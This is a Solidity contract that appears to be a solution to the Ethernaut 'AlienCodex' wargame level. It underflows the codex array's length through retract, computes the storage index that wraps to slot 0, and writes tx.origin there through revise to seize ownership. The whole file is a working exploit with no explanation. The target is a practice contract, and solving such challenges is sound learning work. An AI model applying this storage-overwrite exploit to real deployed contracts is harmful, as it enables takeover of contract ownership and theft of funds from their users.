// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.5.0;
import "../Eth19_AlienCodex.sol";

contract Enigma {

    AlienCodex private alien;
    constructor(address _codex) public {
        alien = AlienCodex(_codex);
    }

    function hackCodex() external {
        uint indexOfOwner = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 miAdderessa = bytes32(uint256(uint160(tx.origin)));
        alien.make_contact();
        alien.retract();
        alien.revise(indexOfOwner, miAdderessa);
    }
}
